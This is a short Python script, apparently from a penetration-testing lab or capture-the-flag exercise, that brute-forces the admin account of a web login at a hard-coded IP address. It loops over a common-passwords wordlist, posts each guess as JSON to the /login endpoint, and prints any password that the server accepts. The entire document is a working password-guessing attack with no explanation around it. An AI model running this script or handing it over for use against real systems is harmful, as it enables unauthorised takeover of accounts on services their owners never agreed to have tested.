import json
import requests

baseUrl = "http://192.26.205.3:8081"

def makeRequest(password):
    data = {
    "identifier":"admin",
    "password":password
    }

    headers = {
    "Content-Type": "application/json"
    }

    r = requests.post(baseUrl + "/login", json.dumps(data), headers = headers)
    return r.json()

wordlist = open("/root/Desktop/wordlists/100-common-passwords.txt", "r")

for word in wordlist:
    # removing the trailing \n character
    word = word[:-1]

    result = makeRequest(word)

    if "Error" not in result:
        print("==========")
        print("Username: admin")
        print(f"Password: {word}")
